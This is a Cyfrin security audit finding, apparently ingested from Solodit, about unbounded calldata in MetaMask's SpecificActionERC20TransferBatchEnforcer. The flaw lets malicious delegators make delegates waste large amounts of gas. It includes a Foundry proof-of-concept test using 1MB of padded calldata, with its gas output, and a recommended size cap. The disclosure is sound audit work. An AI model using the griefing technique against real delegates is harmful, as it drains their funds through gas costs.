---
affected_contracts: []
derives_from: []
id: solodit-cyfrin-2025-04-01-cyfrin-metamask-delegationframework2-v2-0-0-2
ingested_at: '2026-08-09T05:32:30Z'
protocol_category: []
published_at: '2025-04-01T00:00:00Z'
related_swc: []
severity: Medium
source: solodit
source_url: https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-04-01-cyfrin-Metamask-DelegationFramework2-v2.0.md
tags:
- firm:cyfrin
- report:2025-04-01-cyfrin-metamask-delegationframework2-v2-0
title: Malicious user can create delegations that will spend unlimited amount of gas
  with `SpecificActionERC20TransferBatchEnforcer` caveat
vuln_class: []
---

# Malicious user can create delegations that will spend unlimited amount of gas with `SpecificActionERC20TransferBatchEnforcer` caveat

_Section severity (from Solodit section header): Medium_  
_Audit firm: Cyfrin_  
_Source report: [2025-04-01-cyfrin-Metamask-DelegationFramework2-v2.0.md](https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-04-01-cyfrin-Metamask-DelegationFramework2-v2.0.md)_

---

**Description:** The `SpecificActionERC20TransferBatchEnforcer` first execution has no limit on the calldata size. This allows a malicious user to create delegations that will waste unlimited amount of gas from the delegates.
```solidity
    function beforeHook(
        bytes calldata _terms,
        bytes calldata,
        ModeCode _mode,
        bytes calldata _executionCallData,
        bytes32 _delegationHash,
        address _delegator,
        address
    )
        public
        override
        onlyBatchExecutionMode(_mode)
    {
        ...
        if (
            executions_[0].target != terms_.firstTarget || executions_[0].value != 0
                || keccak256(executions_[0].callData) != keccak256(terms_.firstCalldata)
        ) {
            revert("SpecificActionERC20TransferBatchEnforcer:invalid-first-transaction");
        }
        ...
    }
```
In order to compute the `keccak256` hash function, the code needs to store the whole `terms_.firstCalldata` into memory. So a huge chunk of calldata will increase the memory expansion cost quadratically.

Notice also that the delegator can arbitrarily increase the calldata size without compromising the output of the execution. For example, if the delegator wants to execute the `increment(uint256 num)` function from a contract, the bytes after the argument will just be ignored by the compiler.
This calldata:
```
0x7cf5dab00000000000000000000000000000000000000000000000000000000000000001
```
Will have the same execution output as:
```
0x7cf5dab00000000000000000000000000000000000000000000000000000000000000001fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff...
```
Hence, calldata size can be arbitrarily increased without compromising execution output

**Impact:** A malicious user can create delegations that will waste unlimited amount of gas from the delegates.

**Proof of Concept:**
```solidity
function testGriefingAttackSpecificActionERC20TransferEnforcer() public {
        // Generate a very large calldata (e.g., 1MB)
        bytes memory largeCalldata = new bytes(1_000_000);
        for (uint256 i = 0; i < largeCalldata.length; i++) {
            largeCalldata[i] = 0xFF;
        }

        // Create terms with the large calldata
        bytes memory terms = abi.encodePacked(
            address(token), // tokenAddress
            address(0x1), // recipient
            uint256(100), // amount
            address(0x1), // firstTarget
            largeCalldata // firstCalldata
        );

        // Create a batch execution with the expected large calldata
        Execution[] memory executions = new Execution[](2);
        executions[0] = Execution({ target: address(0x1), value: 0, callData: largeCalldata });
        executions[1] = Execution({
            target: address(token),
            value: 0,
            callData: abi.encodeWithSelector(IERC20.transfer.selector, address(0x1), 100)
        });

        bytes memory executionCallData = abi.encode(executions);

        // Measure gas usage of the beforeHook call
        uint256 startGas = gasleft();

        vm.startPrank(address(delegationManager));
        // This would be extremely expensive due to the large calldata
        batchEnforcer.beforeHook(
            terms,
            bytes(""),
            batchDefaultMode, // Just a dummy mode code
            executionCallData,
            keccak256("delegation1"),
            address(0),
            address(0)
        );

        uint256 gasUsed = startGas - gasleft();
        vm.stopPrank();

        console.log("Gas used for beforeHook with 1MB calldata:", gasUsed);
    }
```
Output gas:
```
Ran 1 test for test/enforcers/SpecificActionERC20TransferBatchEnforcer.t.sol:SpecificActionERC20TransferBatchEnforcerTest
[PASS] testGriefingAttackSpecificActionERC20TransferEnforcer() (gas: 207109729)
```

**Recommended Mitigation:** Consider constraining the calldata size to a specific limit

**MetaMask:**
Acknowledged. It is on the delegate to validate the delegation before executing it.

**Cyfrin:** Acknowledged.
